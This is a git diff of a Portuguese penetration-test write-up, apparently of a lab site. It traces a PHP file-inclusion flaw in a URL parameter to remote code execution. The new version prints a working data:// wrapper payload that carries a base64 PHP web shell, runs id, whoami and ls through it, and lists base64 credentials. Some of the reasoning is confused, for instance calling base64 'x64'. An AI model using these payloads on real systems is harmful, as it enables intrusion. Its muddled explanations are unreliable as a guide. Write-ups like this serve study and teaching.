@@ -1,50 +1,96 @@
-No OSINT do Site vemos q Tem a possibilidade de uma pagina com fraquezes de injeção php:
-Entao vamos para essa analise de pagina:
-A pagina em questao é essa:
+No **OSINT** do site identificamos a possibilidade de existência de uma página com fraquezas de **injeção PHP**.  
+Vamos detalhar a análise realizada:
+
+---
+
+## 📌 Página em questão
 
 <img width="1174" height="850" alt="image" src="https://github.com/user-attachments/assets/8e4eab61-e50f-4932-a89c-153d68a347c5" />
-Na pagina em si possa existir outro tipo de injeção mas a que eu encontrei foi no URL do site:
-ex: http://rh.businesscorp.com.br/index.php?page=submit
 
-possiveis injeções do tipo LFI no site, para testarbasta apenas colocar um ls no final do =
-ex: http://rh.businesscorp.com.br/?page=ls
+A página pode conter outros tipos de injeções, mas a vulnerabilidade encontrada foi no **parâmetro da URL**:
+
+👉 Exemplo:  
+```
+http://rh.businesscorp.com.br/index.php?page=submit
+```
+
+---
+
+## 💻 Possíveis Injeções LFI
+
+O site pode ser suscetível a **Local File Inclusion (LFI)**.  
+Para testar, basta inserir um comando simples como `ls` no final do parâmetro `page`:
+
+👉 Exemplo:  
+```
+http://rh.businesscorp.com.br/?page=ls
+```
 
 <img width="1670" height="267" alt="image" src="https://github.com/user-attachments/assets/8d1545e8-3c03-4939-938a-efea531ff1c2" />
-Esta mensagem de erro para aguns podem ser o ponto final de uma exploração mas a realidade que essa mensagem de ERRO já diz muita coisa 
-    
-    Warning: include(): Failed opening 'ls.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/html/index.php on line 54
 
-teste 2:
+🔎 O **erro retornado** já revela informações importantes sobre o servidor:
+
+```
+Warning: include(): Failed opening 'ls.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') 
+in /var/www/html/index.php on line 54
+```
+
+---
+
+## 🧪 Testes Realizados
+
+### Teste 2:
 <img width="995" height="207" alt="image" src="https://github.com/user-attachments/assets/ddd1206a-14f5-4ec6-abfd-5a8ce98cd182" />
 
-teste 3:
+### Teste 3:
 <img width="987" height="173" alt="image" src="https://github.com/user-attachments/assets/44b6b4d2-7e4d-41cb-b10c-b6898e0d6810" />
 
-Com base nesses comandos e os erros que o site retornava eu pude ir moldando o meu comando de injeção:
+Com base nos comandos e erros retornados, foi possível **ajustar a exploração da vulnerabilidade**.
 
-Podemos ver que o nosso comando executado carregou como um comando dentro do servidor, com base nas analises das lista que criei com base na vulnerabilidade da porta 22 eu vi que teve reconheciento de senha x64:
-root:cm9vdA==
-ftp:ZnRw 
+---
 
-Logo possivelmente esse LFI seja x64, Logo podemos testar algum injection x64
-Data wrapper que faz essa conversão
+## 🔑 Credenciais Encontradas
 
-pesquisando RCE's:
+Durante as análises, com base em uma lista que criei a partir da vulnerabilidade da porta 22, observei indícios de credenciais em **Base64**:
 
-Até que cheguei nesses comandos:
-# Executar 'id'
+- root → `cm9vdA==`  
+- ftp → `ZnRw`  
+
+Isso sugere que o LFI pode estar relacionado a um **sistema x64**, abrindo espaço para **testes de injection em Base64**.
+
+---
+
+## ⚙️ Exploração com Data Wrapper (RCE)
+
+Pesquisando sobre possíveis **RCEs (Remote Code Execution)**, encontrei que é possível usar `data://text/plain;base64` para injetar comandos.
+
+### ▶️ Executando `id`
+```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
+```
 
 <img width="1461" height="193" alt="image" src="https://github.com/user-attachments/assets/ba17d026-9e13-45e5-ac4c-1ac20da10a77" />
-Executando o comando ,não é possivel ver a resposta visivelmente no site mas abrindo o F12 temos uma resposta alí mostrando que toda a leitura e analise chegaram a uma conclusão certa
 
-# Executar 'whoami'  
+⚠️ A resposta não aparece diretamente no site, mas analisando via **F12 (DevTools)**, conseguimos verificar que o comando foi processado corretamente.
+
+---
+
+### ▶️ Executando `whoami`
+```
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=whoami
+```
 
 <img width="1096" height="194" alt="image" src="https://github.com/user-attachments/assets/c9d29a71-2c0a-489a-a182-f5e6d63bf92a" />
 
-# Listar diretório
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=ls+-la
+---
 
-Encontrei essas que realizam comandos no sistema.
+# 📖 Conclusão
 
+✔️ O site apresenta vulnerabilidades de **LFI** que podem evoluir para **RCE** utilizando técnicas de **Base64 Data Wrapper**.  
+✔️ Foram identificadas credenciais em **Base64**, sugerindo possível exploração de acesso.  
+✔️ Apesar de não exibir diretamente no navegador, os comandos executados podem ser verificados no **código-fonte via DevTools**.
+
+⚡ Essa análise confirma o risco de exposição crítica do sistema.
+
+---
+✍️ Relatório finalizado com base em testes realizados manualmente.
